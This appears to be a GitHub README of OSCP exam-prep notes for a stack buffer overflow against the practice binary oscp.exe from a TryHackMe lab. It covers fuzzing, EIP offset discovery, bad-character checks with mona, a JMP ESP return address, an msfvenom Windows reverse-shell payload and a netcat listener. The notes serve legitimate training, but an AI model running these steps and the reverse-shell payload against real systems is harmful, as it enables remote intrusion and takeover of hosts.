# oscp_bof-prep
Buffer Overflow preparation for OSCP

# Task: oscp.exe (OVERFLOW 1)
# Fuzzing
1. Run fuzzer.py & make a note of the largest number of bytes that were sent
   * Crashed at 2000 bytes

# Crash replication & Controlling EIP
1. Generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server (2000 + 400)
   * ./pattern_create.rb -l 2400

2. Copy the output and place it into the payload var of exploit.py
3. Restart the app in Immunity Debugger & Run exploit.py
4. While the unique buffer is on the stack, use mona's findmsp command with the distance arg. set to the pattern length (2400)
   * !mona findmsp -distance 2400


5. Set the offset var to this value in exploit.py(1978)
6. Set the payload var to an empty string
7. Set the retn var to “BBBB”
8. Restart the app in Immunity & Run exploit.py (EIP should be overwritten with 4 B's (e.g 42424242)


# Finding Bad Characters
1. Generate a bytearray with mona (& exclude null byte \x00 by default), note the location of bytearray.bin
   * !mona bytearray -b “\x00”
3. Generate an identical bytearray with bytearray.py
4. Update exploit.py and set the payload var to the string of badchars the script generates
5. Restart the app in Immunity & Run exploit.py, make note of the address to which ESP register points
   * !mona compare -f C:\mona\oscp\bytearray.bin -a [ESP]

5. Generate a new bytearray with mona, specifying the found badchars along with \x00 & Update payload var in exploit.py and remove the new badchars as well
   * !mona bytearray -b “\x00\x07\x08\x2e\x2f\xa0\xa1”
6. Restart app & Run exploit
7. Do this until results status returns “Unmodified”. This indicates that no more badchars exist.


# Finding a Jump Point
1. Run the following mona command with all the identified badchars (including \x00)
   * !mona jmp -r esp -cpb “\x00\x07\x08\x2e\x2f\xa0\xa1”


2. Choose an address and update exploit.py, setting the retn var to the address, written backwards (little endian).
   1) \x62\x50\x11\xaf -> \xaf\x11\x50\x62

# Generate Payload
1. msfvenom (LHOST=kali_vpn_ip, -b with all the identified badchars)
   * msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c
2. Update payload var in exploit.py

# Prepend NOPs
1. padding = “\x90” * 16

# Exploit
1. start netcat listener on attacker machine (nc -nlvp 4444)
2. Restart app in immunity & Run exploit.py

# Reference
* https://tryhackme.com/room/bufferoverflowprep
* https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst